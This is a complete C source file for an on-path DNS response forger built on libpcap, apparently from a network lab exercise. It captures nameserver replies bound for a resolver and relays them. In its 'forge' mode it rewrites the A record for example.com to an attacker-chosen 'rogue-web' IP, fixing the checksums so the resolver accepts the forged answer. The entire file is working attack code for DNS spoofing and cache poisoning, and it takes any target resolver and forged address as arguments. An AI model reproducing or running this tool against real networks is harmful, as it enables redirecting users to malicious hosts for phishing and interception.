/*
 * interceptor.c  --  Phase 2 on-path DNS response forger (C + libpcap)
 *
 * Position: the attacker sits on the resolver subnet (172.16.2.100). A route on
 * core-router sends every reply bound for the resolver (172.16.2.10) to us first
 * (next-hop = our IP), so the genuine nameserver responses arrive at OUR NIC with
 * our MAC as the L2 destination but the resolver's IP as the L3 destination.
 *
 * We are a transparent L2 relay: for each captured response we rewrite the
 * Ethernet destination to the resolver's real MAC and re-inject it, so the
 * resolver receives exactly one answer per query (no race -- we are the sole
 * deliverer). In FORGE mode we additionally rewrite the A record of
 * "example.com" (and only that owner name, in the ANSWER section) to point at
 * rogue-web (172.16.1.30); every other name -- referrals, www.example.com, glue
 * -- is relayed byte-for-byte.
 *
 * We do NOT enable IP forwarding and we do NOT bridge: delivery is done purely by
 * libpcap capture + injection, which is why the attacker needs only NET_RAW.
 *
 * Build:  make           (needs libpcap-dev)
 * Run:    ./interceptor <iface> <resolver-ip> <forged-ip> <relay|forge>
 *   e.g.  ./interceptor eth0 172.16.2.10 172.16.1.30 forge
 */
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define ETH_HLEN 14
#define TARGET_NAME "example.com"

static int   g_forge;             /* 1 = rewrite example.com A, 0 = pure relay */
static uint8_t g_res_mac[6];      /* resolver MAC (L2 next hop for delivery)     */
static uint8_t g_our_mac[6];      /* our NIC MAC (L2 source for injected frames) */
static uint32_t g_forged_ip;      /* network-order A to inject for example.com   */
static pcap_t *g_pcap;
static unsigned long g_seen, g_forged;

/* ---- get our interface MAC via ioctl ---- */
static int if_mac(const char *ifn, uint8_t mac[6]) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    struct ifreq ifr; memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, ifn, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) { close(s); return -1; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(s);
    return 0;
}

/* ---- learn a neighbour's MAC: prime ARP with one ping, read /proc/net/arp ---- */
static int neigh_mac(const char *ip, uint8_t mac[6]) {
    char cmd[128];
    snprintf(cmd, sizeof cmd, "ping -c1 -W1 %s >/dev/null 2>&1", ip);
    for (int attempt = 0; attempt < 5; attempt++) {
        system(cmd);
        FILE *f = fopen("/proc/net/arp", "r");
        if (!f) return -1;
        char line[256];
        fgets(line, sizeof line, f);                 /* header */
        while (fgets(line, sizeof line, f)) {
            char aip[64], hw[64], mask[64], dev[64], hwt[64], flags[64];
            if (sscanf(line, "%63s %63s %63s %63s %63s %63s",
                       aip, hwt, flags, hw, mask, dev) >= 4 &&
                strcmp(aip, ip) == 0 && strcmp(hw, "00:00:00:00:00:00") != 0) {
                unsigned v[6];
                if (sscanf(hw, "%x:%x:%x:%x:%x:%x",
                           &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) == 6) {
                    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
                    fclose(f);
                    return 0;
                }
            }
        }
        fclose(f);
        usleep(200000);
    }
    return -1;
}

/* ---- decompress a DNS name starting at off; return wire bytes consumed at off ---- */
static int dns_name(const uint8_t *msg, int msglen, int off, char *out, int outsz) {
    int wire_end = -1, op = 0, hops = 0;
    out[0] = '\0';
    while (off < msglen) {
        uint8_t len = msg[off];
        if ((len & 0xC0) == 0xC0) {                   /* compression pointer */
            if (off + 1 >= msglen) return -1;
            if (wire_end < 0) wire_end = off + 2;
            off = ((len & 0x3F) << 8) | msg[off + 1];
            if (++hops > 128) return -1;
            continue;
        }
        if (len == 0) { if (wire_end < 0) wire_end = off + 1; break; }
        off++;
        if (off + len > msglen) return -1;
        for (int i = 0; i < len && op < outsz - 2; i++)
            out[op++] = msg[off + i];
        out[op++] = '.';
        off += len;
    }
    if (op > 0 && out[op - 1] == '.') op--;           /* trim trailing dot */
    out[op] = '\0';
    return wire_end;
}

/* ---- recompute the IPv4 header checksum (field must be zeroed first) ---- */
static uint16_t ip_checksum(const uint8_t *ip, int ihl) {
    uint32_t sum = 0;
    for (int i = 0; i < ihl; i += 2) sum += (ip[i] << 8) | ip[i + 1];
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

/* ---- recompute the UDP checksum over the IPv4 pseudo-header + UDP segment ---- */
static uint16_t udp_checksum(const uint8_t *ip, const uint8_t *udp, int udplen) {
    uint32_t sum = 0;
    sum += (ip[12] << 8) | ip[13];   sum += (ip[14] << 8) | ip[15];   /* src */
    sum += (ip[16] << 8) | ip[17];   sum += (ip[18] << 8) | ip[19];   /* dst */
    sum += 17;                                                        /* proto */
    sum += udplen;                                                    /* udp len */
    for (int i = 0; i + 1 < udplen; i += 2)
        sum += (udp[i] << 8) | udp[i + 1];
    if (udplen & 1) sum += udp[udplen - 1] << 8;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    uint16_t cs = (uint16_t)~sum;
    return cs ? cs : 0xFFFF;          /* 0 means "no checksum"; avoid it */
}

/* ---- rewrite example.com A records in the answer section; return 1 if changed ---- */
static int forge_answer(uint8_t *dns, int dnslen) {
    if (dnslen < 12) return 0;
    int qd = (dns[4] << 8) | dns[5];
    int an = (dns[6] << 8) | dns[7];
    uint16_t flags = (dns[2] << 8) | dns[3];
    if (!(flags & 0x8000)) return 0;                 /* responses only */
    int off = 12;
    char name[256];
    for (int i = 0; i < qd; i++) {                   /* skip questions */
        int c = dns_name(dns, dnslen, off, name, sizeof name);
        if (c < 0) return 0;
        off = c + 4;                                 /* qtype + qclass */
    }
    int changed = 0;
    for (int i = 0; i < an; i++) {                   /* walk answers */
        int c = dns_name(dns, dnslen, off, name, sizeof name);
        if (c < 0) return 0;
        off = c;
        if (off + 10 > dnslen) return 0;
        uint16_t type = (dns[off] << 8) | dns[off + 1];
        uint16_t cls  = (dns[off + 2] << 8) | dns[off + 3];
        uint16_t rdl  = (dns[off + 8] << 8) | dns[off + 9];
        int rdata = off + 10;
        if (type == 1 && cls == 1 && rdl == 4 &&
            strcasecmp(name, TARGET_NAME) == 0 &&
            rdata + 4 <= dnslen) {
            memcpy(dns + rdata, &g_forged_ip, 4);    /* -> rogue-web */
            changed = 1;
        }
        off = rdata + rdl;
    }
    return changed;
}

/* ---- per-packet callback: (optionally) forge, retarget L2, inject ---- */
static void on_packet(u_char *u, const struct pcap_pkthdr *h, const u_char *pkt) {
    (void)u;
    if (h->caplen < ETH_HLEN + 20 + 8) return;
    uint8_t *frame = malloc(h->caplen);
    if (!frame) return;
    memcpy(frame, pkt, h->caplen);

    uint8_t *ip  = frame + ETH_HLEN;
    int ihl = (ip[0] & 0x0F) * 4;
    uint8_t *udp = ip + ihl;
    int udplen   = (udp[4] << 8) | udp[5];
    uint8_t *dns = udp + 8;
    int dnslen   = udplen - 8;
    if (dnslen < 12 || dns + dnslen > frame + h->caplen) { free(frame); return; }

    g_seen++;
    int forged = 0;
    if (g_forge) forged = forge_answer(dns, dnslen);
    if (forged) g_forged++;

    /* Captured frames carry offloaded (incomplete) checksums on veth, which are
       invalid once injected as raw bytes. Recompute IP + UDP checksums for EVERY
       frame we send -- relayed or forged -- so the resolver accepts them. */
    ip[10] = 0; ip[11] = 0;
    uint16_t ics = ip_checksum(ip, ihl);
    ip[10] = ics >> 8; ip[11] = ics & 0xFF;
    udp[6] = 0; udp[7] = 0;
    uint16_t ucs = udp_checksum(ip, udp, udplen);
    udp[6] = ucs >> 8; udp[7] = ucs & 0xFF;

    memcpy(frame, g_res_mac, 6);        /* deliver to the resolver */
    memcpy(frame + 6, g_our_mac, 6);    /* from us */

    if (pcap_inject(g_pcap, frame, h->caplen) < 0)
        fprintf(stderr, "inject failed: %s\n", pcap_geterr(g_pcap));
    else
        printf("[%s] relayed %d-byte DNS reply -> resolver%s (seen=%lu forged=%lu)\n",
               g_forge ? "forge" : "relay", dnslen,
               forged ? "  *** example.com A REWRITTEN -> rogue-web ***" : "",
               g_seen, g_forged);
    fflush(stdout);
    free(frame);
}

int main(int argc, char **argv) {
    if (argc != 5) {
        fprintf(stderr, "usage: %s <iface> <resolver-ip> <forged-ip> <relay|forge>\n", argv[0]);
        return 1;
    }
    const char *iface = argv[1], *res_ip = argv[2], *forged_ip = argv[3];
    g_forge = (strcmp(argv[4], "forge") == 0);
    g_forged_ip = inet_addr(forged_ip);

    if (if_mac(iface, g_our_mac) < 0) { fprintf(stderr, "cannot read %s MAC\n", iface); return 1; }
    if (neigh_mac(res_ip, g_res_mac) < 0) { fprintf(stderr, "cannot resolve resolver MAC\n"); return 1; }

    char errbuf[PCAP_ERRBUF_SIZE];
    g_pcap = pcap_open_live(iface, 65535, 0 /*non-promisc*/, 100, errbuf);
    if (!g_pcap) { fprintf(stderr, "pcap_open_live: %s\n", errbuf); return 1; }

    /* capture only nameserver replies bound for the resolver, and never our own
       injected frames (prevents a capture->inject loop). */
    char filter[256];
    snprintf(filter, sizeof filter,
             "udp and src port 53 and dst host %s and not ether src %02x:%02x:%02x:%02x:%02x:%02x",
             res_ip, g_our_mac[0],g_our_mac[1],g_our_mac[2],g_our_mac[3],g_our_mac[4],g_our_mac[5]);
    struct bpf_program bp;
    if (pcap_compile(g_pcap, &bp, filter, 1, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(g_pcap, &bp) < 0) {
        fprintf(stderr, "filter error: %s\n", pcap_geterr(g_pcap)); return 1;
    }

    printf("interceptor up: iface=%s mode=%s resolver=%s(%02x:%02x:%02x:%02x:%02x:%02x) forged=%s\n",
           iface, g_forge ? "forge" : "relay", res_ip,
           g_res_mac[0],g_res_mac[1],g_res_mac[2],g_res_mac[3],g_res_mac[4],g_res_mac[5], forged_ip);
    printf("filter: %s\n", filter); fflush(stdout);

    pcap_loop(g_pcap, -1, on_packet, NULL);
    pcap_close(g_pcap);
    return 0;
}
